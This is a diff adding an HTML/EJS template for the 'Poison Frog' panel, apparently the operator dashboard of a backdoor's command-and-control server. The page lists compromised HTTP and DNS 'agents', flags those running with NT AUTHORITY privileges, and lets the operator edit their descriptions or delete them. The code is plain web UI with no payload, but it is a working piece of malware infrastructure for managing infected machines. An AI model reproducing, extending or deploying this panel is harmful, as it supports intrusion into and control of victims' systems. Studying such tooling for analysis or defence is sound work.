@@ -1,0 +1,251 @@
+<!DOCTYPE html>
+<html>
+<head>
+	<meta http-equiv="Content-type" content="text/html; charset=utf-8" />
+	<title>Welcome</title>
+	<link rel="stylesheet" href="../css/style.css" type="text/css" media="all" />
+	<script>
+		function saveDescription(e) {
+			if (e.keyCode == 13) {
+				var agentDescription = e.target.value;
+				var agentId = e.target.getAttribute("class");
+
+				var form = document.createElement("form");
+				form.setAttribute("method", "post");
+				form.setAttribute("action", "/des");
+				var hiddenField = document.createElement("input");
+				hiddenField.setAttribute("type", "hidden");
+				hiddenField.setAttribute("name", "agentId");
+				hiddenField.setAttribute("value", agentId);
+				form.appendChild(hiddenField);
+				var hiddenField1 = document.createElement("input");
+				hiddenField1.setAttribute("type", "hidden");
+				hiddenField1.setAttribute("name", "agentDescription");
+				hiddenField1.setAttribute("value", agentDescription);
+            	form.appendChild(hiddenField1);
+				document.body.appendChild(form);
+				form.submit();
+
+				return false;
+			}
+		}
+
+		var auto_refresh = setInterval(
+			function (){
+				location.reload();
+			}, 120000);
+	</script>
+</head>
+
+<body>
+<div id="header">
+	<div class="shell">
+		<!-- Logo + Top Nav -->
+		<div id="top">
+			<h1>Prepare for poison.</h1>
+			<div id="top-navigation">
+				Welcome to <strong>Poison Frog</strong> panel.
+				<span>|</span>
+				<a href="#">Help</a>
+				<span>|</span>
+				<a href="#">Log out</a>
+			</div>
+		</div>
+		<!-- End Logo + Top Nav -->
+		
+		<!-- Main Nav -->
+		<div id="navigation">
+			<ul>
+			    <li onClick="javascript:window.location.href='/in/http'" <% if(state =='httpActive') { %> class="active" <% } %>><span>HTTP agents</span></li>
+			    <li onClick="javascript:window.location.href='/in/dns'"  <% if(state =='dnsActive')  { %> class="active" <% } %>><span>DNS agents</span></li>
+			</ul>
+		</div>
+		<!-- End Main Nav -->
+	</div>
+</div>
+<!-- End Header -->
+
+<!-- Container -->
+<div id="container">
+	<div class="shell">
+		<!-- Main -->
+		<div id="main">
+			<div class="cl">&nbsp;</div>
+			
+			<!-- Content -->
+			<!-- <div id="content"> -->
+								
+				<div class="box">
+					<!-- Box Head -->
+					<div class="box-head">
+						<h2 class="left">Count: <%= agents.length %></h2>
+						<div class="right">
+							<!--<label>search articles</label>
+							<input type="text" class="field small-field" />
+							<input type="submit" class="button" value="search" />-->
+						</div>
+					</div>
+					<!-- End Box Head -->	
+
+					<!-- Table -->
+					<div class="table">
+						<table width="100%" border="0" cellspacing="0" cellpadding="0" id="myTable">
+							<tr>
+								<th width="13"><input type="checkbox" class="checkbox" /></th>
+						        <th onclick="sortTable(1)">Title</th>
+                                <th onclick="sortTable(2)">Date</th>
+                                <th onclick="sortTable(3)">State</th>
+                                <th onclick="sortTable(4)">Description</th>
+                                <th onclick="sortTable(5)">Access Levels</th>
+						        <th width="110" class="ac">Content Control</th>					
+                            </tr>
+													
+							
+							
+							
+							<% for(var i=0; i < agents.length; i++) { %>
+								<tr style="cursor: pointer;<%= agents[i][5] %>"  ><!-- class="odd" -->
+									<td onClick="javascript:window.location.href='/<%= agents[i][4] %><><%= agents[i][0] %>'" ><input type="checkbox" class="checkbox" /></td>
+									<td onClick="javascript:window.location.href='/<%= agents[i][4] %><><%= agents[i][0] %>'" ><h3><%= agents[i][0] %></h3></td>
+									<td onClick="javascript:window.location.href='/<%= agents[i][4] %><><%= agents[i][0] %>'" ><%= agents[i][2] %></td>
+									<td onClick="javascript:window.location.href='/<%= agents[i][4] %><><%= agents[i][0] %>'" ><%= agents[i][3] %></td>
+									<td ><input id="description" style="border:none;font-size: 16px;" class="<%= agents[i][0] %>" type="input" onkeypress="return saveDescription(event)" value="<%= agents[i][6] %>"></input></td>
+									<td onClick="javascript:window.location.href='/<%= agents[i][4] %><><%= agents[i][0] %>'" ><%if(agents[i][0].charAt(4).toUpperCase() =="N"&&agents[i][0].charAt(5).toUpperCase() =="T") {%>NT Autority<%}else{%>User<%}%></td>
+									<td onClick="javascript:window.location.href='/delagent/<%= agents[i][4] %><><%= agents[i][0] %>'"><a class="ico del">Delete</a></td>
+								</tr>
+								
+								
+
+
+<script>
+function sortTable(n) {
+	
+  var table, rows, switching, i, x, y, shouldSwitch, dir, switchcount = 0;
+  table = document.getElementById("myTable");
+  switching = true;
+  // Set the sorting direction to ascending:
+  dir = "asc";
+  /* Make a loop that will continue until
+  no switching has been done: */
+  while (switching) {
+    // Start by saying: no switching is done:
+    switching = false;
+    rows = table.rows;
+    /* Loop through all table rows (except the
+    first, which contains table headers): */
+	
+    for (i = 1; i < (rows.length - 1); i++) {
+      // Start by saying there should be no switching:
+      shouldSwitch = false;
+      /* Get the two elements you want to compare,
+      one from current row and one from the next: */
+      x = rows[i].getElementsByTagName("TD")[n];
+      y = rows[i + 1].getElementsByTagName("TD")[n];
+      /* Check if the two rows should switch place,
+      based on the direction, asc or desc: */
+      if (dir == "asc") {
+        if (x.innerHTML.toLowerCase() > y.innerHTML.toLowerCase()) {
+          // If so, mark as a switch and break the loop:
+          shouldSwitch = true;
+          break;
+        }
+      } else if (dir == "desc") {
+        if (x.innerHTML.toLowerCase() < y.innerHTML.toLowerCase()) {
+          // If so, mark as a switch and break the loop:
+          shouldSwitch = true;
+          break;
+        }
+      }
+    }
+    if (shouldSwitch) {
+      /* If a switch has been marked, make the switch
+      and mark that a switch has been done: */
+      rows[i].parentNode.insertBefore(rows[i + 1], rows[i]);
+      switching = true;
+      // Each time a switch is done, increase this count by 1:
+      switchcount ++;
+    } else {
+      /* If no switching has been done AND the direction is "asc",
+      set the direction to "desc" and run the while loop again. */
+      if (switchcount == 0 && dir == "asc") {
+        dir = "desc";
+        switching = true;
+      }
+    }
+  }
+}
+</script>
+								
+							<% } %>
+						</table>
+					</div>
+					<!-- Table -->
+				</div>
+				<!-- End Box -->
+			<!-- </div> -->
+			<!-- End Content -->
+			
+			<!-- Sidebar 
+			<div id="sidebar">
+				
+				<!-- Box 
+				<div class="box">
+					
+					<!-- Box Head 
+					<div class="box-head">
+						<h2>Management</h2>
+					</div>
+					<!-- End Box Head
+					
+					<div class="box-content">
+						<div class="cl">&nbsp;</div>
+						<form action="/des/" enctype="multipart/form-data" method="POST">
+							<div class="buttons">
+								<label>Upload descrioption</label>
+								<input type="hidden" name="agentType" value="<% if(state =='httpActive') { %>http<% } else { %>dns<% } %>" />
+								<input type="file" name="uploadFile" />
+								<input type="submit" class="button"  value="Upload" />
+							</div>
+						</form>
+						
+						<!-- Sort 
+						<div class="sort">
+							<label>Sort by</label>
+							<select class="field">
+								<option value="">Title</option>
+							</select>
+							<select class="field">
+								<option value="">Date</option>
+							</select>
+							<select class="field">
+								<option value="">Author</option>
+							</select>
+						</div>
+						 End Sort 
+						
+					</div>
+				</div>
+				<!-- End Box 
+			</div>
+			<!-- End Sidebar -->
+			
+			<div class="cl">&nbsp;</div>			
+		</div>
+		<!-- Main -->
+	</div>
+</div>
+<!-- End Container -->
+
+<!-- Footer -->
+<div id="footer">
+	<div class="shell">
+		<span class="left">&copy; Poison frog</span>
+		<span class="right">
+			Changed by <a href="#" target="_blank" title="The Sweetest CSS Templates WorldWide">Poison Frog Teams</a>
+		</span>
+	</div>
+</div>
+<!-- End Footer -->
+	
+</body>
+</html>
